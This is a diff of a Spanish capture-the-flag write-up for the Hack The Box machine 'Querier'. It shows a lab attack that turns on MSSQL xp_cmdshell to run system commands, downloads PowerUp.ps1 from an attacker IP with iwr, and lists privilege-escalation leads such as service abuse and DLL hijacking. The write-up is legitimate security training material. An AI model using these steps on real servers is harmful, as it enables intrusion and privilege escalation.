@@ -272,22 +272,21 @@ SQL>
 Este usuario si pude activar la función xp_cmdshell.
 
 ```SQL
-SQL> sp_configure 'show advanced options', '1'
+SQL: sp_configure 'show advanced options', '1'
 [*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
-SQL> RECONFIGURE
-SQL> 
+SQL: RECONFIGURE 
 ```
 
-```SQL
-SQL> sp_configure 'xp_cmdshell', '1'
+```SQL:
+SQL: sp_configure 'xp_cmdshell', '1'
 [*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
-SQL> RECONFIGURE
+SQL: RECONFIGURE
 ```
 
 Ahora podemos ejecutar comandos a nivel de sistema:
 
 ```SQL
-SQL> EXEC xp_cmdshell 'whoami'
+SQL: EXEC xp_cmdshell 'whoami'
 output                                                                                                                                                                                                                                                            
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
 querier\mssql-svc
@@ -327,48 +326,19 @@ PS C:\Windows\system32>
 Para la escalada de privilegios voy a usar el script PowerUp.ps1 para enumerar la máquina. Lo primero será descargar el script
 
 ```Powershell
-PS C:\Users\mssql-svc\Desktop> iwr -outf PowerUp.ps1 http://10.10.16.4/PowerUp.ps1
-PS C:\Users\mssql-svc\Desktop>
+PS C:\Users\mssql-svc\Desktop: iwr -outf PowerUp.ps1 http://10.10.16.4/PowerUp.ps1
 ```
 
 Importamos el script:
 
 ```powershell
-PS C:\Users\mssql-svc\Desktop> Import-Module .\PowerUp.ps1
+PS C:\Users\mssql-svc\Desktop: Import-Module .\PowerUp.ps1
 ```
 
 Si lo ejecutamos para que haga todas las comprobaciones nos reporta lo siguiente.
 
 ```PowerShell
-PS C:\Users\mssql-svc\Desktop> Invoke-AllChecks
-
-
-Privilege   : SeImpersonatePrivilege
-Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
-TokenHandle : 3688
-ProcessId   : 4904
-Name        : 4904
-Check       : Process Token Privileges
-
-ServiceName   : UsoSvc
-Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
-StartName     : LocalSystem
-AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
-CanRestart    : True
-Name          : UsoSvc
-Check         : Modifiable Services
-
-ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
-IdentityReference : QUERIER\mssql-svc
-Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
-%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
-Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
-Check             : %PATH% .dll Hijacks
-AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
-
-UnattendPath : C:\Windows\Panther\Unattend.xml
-Name         : C:\Windows\Panther\Unattend.xml
-Check        : Unattended Install Files
+PS C:\Users\mssql-svc\Desktop: Invoke-AllChecks
 
 Changed   : {2019-01-28 23:12:48}
 UserNames : {Administrator}
